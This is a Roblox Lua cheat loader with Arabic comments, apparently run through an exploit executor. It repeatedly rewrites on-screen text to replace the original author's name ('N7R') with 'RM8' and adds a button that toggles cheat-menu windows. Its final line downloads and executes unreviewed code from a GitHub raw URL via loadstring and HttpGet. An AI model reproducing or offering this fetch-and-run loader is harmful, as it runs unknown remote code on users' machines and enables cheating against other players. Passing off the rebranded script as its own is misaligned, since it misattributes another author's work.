-- [[ RM8 KINGDOM - ORIGINAL BASE ]] --

local CoreGui = game:GetService("CoreGui")
local PlayerGui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")

-- 1. دالة تغيير الاسم (مراقبة مستمرة لكل النصوص)
spawn(function()
    while task.wait(0.5) do -- خليتها أسرع شوي عشان الاسم ما يلحق يظهر
        for _, v in pairs(CoreGui:GetDescendants()) do
            if v:IsA("TextLabel") or v:IsA("TextButton") then
                if v.Text:find("N7R") or v.Text:find("عالم المملكة") or v.Text:find("n7r") then
                    v.Text = v.Text:gsub("N7R", "RM8"):gsub("عالم المملكة", "RM8"):gsub("n7r", "RM8")
                end
            end
        end
        for _, v in pairs(PlayerGui:GetDescendants()) do
            if v:IsA("TextLabel") or v:IsA("TextButton") then
                if v.Text:find("N7R") or v.Text:find("عالم المملكة") or v.Text:find("n7r") then
                    v.Text = v.Text:gsub("N7R", "RM8"):gsub("عالم المملكة", "RM8"):gsub("n7r", "RM8")
                end
            end
        end
    end
end)

-- 2. دالة الزر العائم (المقاس الصغير 40)
local function createToggle()
    local sg = Instance.new("ScreenGui", CoreGui)
    sg.Name = "RM8_Control"
    sg.DisplayOrder = 999999

    local btn = Instance.new("TextButton", sg)
    btn.Size = UDim2.new(0, 40, 0, 40) -- المقاس 40
    btn.Position = UDim2.new(0, 10, 0.5, 0)
    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    btn.Text = "RM8"
    btn.TextColor3 = Color3.fromRGB(255, 0, 0)
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 12
    btn.Draggable = true

    local corner = Instance.new("UICorner", btn)
    corner.CornerRadius = UDim.new(0, 50)
    
    local stroke = Instance.new("UIStroke", btn)
    stroke.Color = Color3.fromRGB(255, 0, 0)
    stroke.Thickness = 2

    btn.MouseButton1Click:Connect(function()
        local targetFound = false
        for _, v in pairs(CoreGui:GetChildren()) do
            if v:IsA("ScreenGui") and v.Name ~= "RM8_Control" and v.Name ~= "RobloxGui" then
                if v:FindFirstChild("Main") or v:FindFirstChild("Container") or v.Name:find("Kavo") then
                    v.Enabled = not v.Enabled
                    targetFound = true
                end
            end
        end
        if not targetFound then
            for _, v in pairs(PlayerGui:GetChildren()) do
                if v:IsA("ScreenGui") and (v:FindFirstChild("Main") or v:FindFirstChild("Container")) then
                    v.Enabled = not v.Enabled
                end
            end
        end
    end)
end

createToggle()

-- 3. تشغيل السكربت الأصلي
loadstring(game:HttpGet("https://raw.githubusercontent.com/kkmmai82/kkmmai82/refs/heads/main/Jdh"))()
